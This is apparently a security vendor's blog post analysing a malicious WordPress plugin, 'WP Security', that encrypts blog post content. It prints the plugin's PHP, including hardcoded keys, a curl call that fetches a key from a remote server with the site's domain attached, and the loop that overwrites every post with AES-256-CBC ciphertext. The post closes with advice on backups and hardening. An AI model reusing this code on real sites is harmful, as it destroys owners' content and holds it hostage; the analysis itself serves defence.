@@ -1,0 +1,152 @@
+Malicious Plugin Used to Encrypt WordPress Posts
+
+During a recent cleanup, we found an interesting malicious WordPress plugin, “WP Security”, that was being used to encrypt blog post content. The website owner complained of a newly installed and activated plugin on their website that was rendering their original content unreadable.
+The plugin encrypted posts with the ‘AES-256-CBC’ method by using the openssl_encrypt function, which made it impossible to decrypt without proper keys. This is the first time we’ve seen a plugin target specific blog posts on a website, but it’s possible that we’ll see this more often in the coming months.
+Malicious Plugin File Structure
+The plugin is quite simple and includes only two PHP files and a single log file. There are no controls, nor is there any obvious sign of the plugin on the dashboard once it has been activated.
+Here is the plugin in question:
+
+The posts are encrypted inside the database, however, only the actual post content is encrypted— everything else is untouched:
+
+The result is that the theme and everything else is working as expected, but the posts display an encrypted string:
+
+getEncryptedKey() Function
+Some of the keys are hard coded into the script, but the key needed to decrypt the content is not available.
+Below, you can find one of the functions used to get the encryption key. You can see that some of the keys have been hardcoded:
+function getEncryptedKey() {
+
+$superKey = "b1Z1ZFdEMHFtQlNIR2JNN25TWG9xYzhuTkNGS3BRUThNdjVWUTZhNWZxUTQ5VHh3YTBKelMyRVZBVm1nRHBqVWRIWHI1TGpxNjFOWTFpWXc5RFlGSWc9PQ==";
+
+$FIRSTKEY = 'lMICokWddLYP6SAQ/VdPkca4GPcghIaHtxpw42YahXA=BVQPuDY/dWcz+SBflhFBlzgW5IuawzEeZOMzkhQtrbPz';
+
+$SECONDKEY = '/5zrCa2x51Tn6SAQ';
+
+$encryptionKey = openssl_decrypt(base64_decode($superKey), $this->encrypt_method, $FIRSTKEY, 0, $SECONDKEY);
+
+$encryptionKey = str_replace("\\", "", $encryptionKey);
+
+return $encryptionKey;
+
+}
+The main class is called “WpEncryption”. Using the method below, the plugin reaches out to the remote server with the domain of the website to obtain an encryption key:
+class WpEncryption {
+
+public $secret_key;
+
+public $secret_iv;
+
+public $encryption_flag;
+
+public $key;
+
+public $iv;
+
+private $encrypt_method = 'AES-256-CBC';
+
+private $maxTimeLimit = 300;
+
+public function __construct() {
+
+$this->init();
+
+}
+
+function init() {
+
+$this->getEncryptionKeys();
+
+$this->key = hash('sha256', $this->secret_key);
+
+$this->iv = substr(hash('sha256', $this->secret_iv), 0, 16);
+
+}
+
+function getEncryptionKeys() {
+
+$domain = $_SERVER['SERVER_NAME'];
+
+$response = $this->getEncryotionConfig($domain);
+
+if (empty($response) || $response['http_code'] == 404) {
+
+global $wp_query;
+
+$wp_query->set_404();
+
+status_header(404);
+
+get_template_part(404);
+
+exit();
+
+}
+The script is using CURL to reach the remote server:
+function getEncryotionConfig($domain) {
+
+$user_agent = 'Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0';
+
+$options = array(
+
+CURLOPT_CUSTOMREQUEST => "GET", //set request type post or get
+
+CURLOPT_POST => false, //set to GET
+
+CURLOPT_USERAGENT => $user_agent, //set user agent
+
+CURLOPT_COOKIEFILE => "cookie.txt", //set cookie file
+
+CURLOPT_COOKIEJAR => "cookie.txt", //set cookie jar
+
+CURLOPT_RETURNTRANSFER => true, // return web page
+
+CURLOPT_HEADER => false, // don't return headers
+
+CURLOPT_FOLLOWLOCATION => true, // follow redirects
+
+CURLOPT_ENCODING => "", // handle all encodings
+
+CURLOPT_AUTOREFERER => true, // set referer on redirect
+
+CURLOPT_CONNECTTIMEOUT => 120, // timeout on connect
+
+CURLOPT_TIMEOUT => 120, // timeout on response
+
+CURLOPT_MAXREDIRS => 10, // stop after 10 redirects
+
+);
+
+$ch = curl_init($this->getEncryptedKey() . "?d=" . $domain);
+
+curl_setopt_array($ch, $options);
+
+$content = curl_exec($ch);
+
+$err = curl_errno($ch);
+
+$errmsg = curl_error($ch);
+
+$header = curl_getinfo($ch);
+
+curl_close($ch);
+The plugin obtains a list of all of the posts and encrypts them with the keys. A log file is then generated with a list of the encrypted posts:
+try {
+
+$post_content = $this->encrypt($result->post_content);
+
+$wpdb->update("{$wpdb->prefix}posts", array('id' => $result->id, 'post_content' => $post_content), array('id' => $result->id));
+
+error_log("Successfully encrypted id: " . $result->id . "\n", 3, __DIR__ . DIRECTORY_SEPARATOR . "encryptionError.log");
+
+} catch (Exception $exc) {
+
+error_log($exc->getTraceAsString() . "\n", 3, __DIR__ . DIRECTORY_SEPARATOR . "encryptionError.log");
+A function exists to decrypt all the content, but without the key from the remote server this is not possible.
+404 Response
+During our investigation, we found the script to be calling the following domain to fetch a key for the encryption and /decryption ‘hxxp://www[.]xcelvations[.]com/wpsecurity/secretkeys.php’. The website was returning a “404 page not found” response at the time, so we were unable to do any further testing or attempt to recover the key in order to decrypt the content.
+We believe there could be other websites involved in this campaign—in this case, the website appears to be another victim of an attack, rather than an actual malicious website or some kind of CnC (Command and Control) server.
+We would be happy to investigate this further and attempt to decrypt the content. Let us know if you have been infected with the same malicious plugin or can provide us with a copy from a website you are working on. You can reach me on Twitter: @KrasimirSec
+Conclusion
+For this particular incident we couldn’t decode the posts due to the strong encoding algorithm used, however we were able to recover them from a database backup.
+This demonstrates how malicious plugins can be added to a website and wreak havoc, especially if backups are unavailable. We always recommend that website owners backup files and databases. Our backup service can accomplish that for you.
+After this kind of attack, we always encourage webmasters to update all plugins and themes along with core WordPress files. It’s also highly recommended that the database password be reset, as attackers often steal login credentials to connect remotely to the database after an infection is cleaned.
+Our WordPress security guide is a very helpful resource for site owners, and includes hardening recommendations to further tighten the security of your website. A web application firewall can also be a life saver, as it prevents the site from being infected in the first place and helps prevent compromises due to software vulnerabilities.
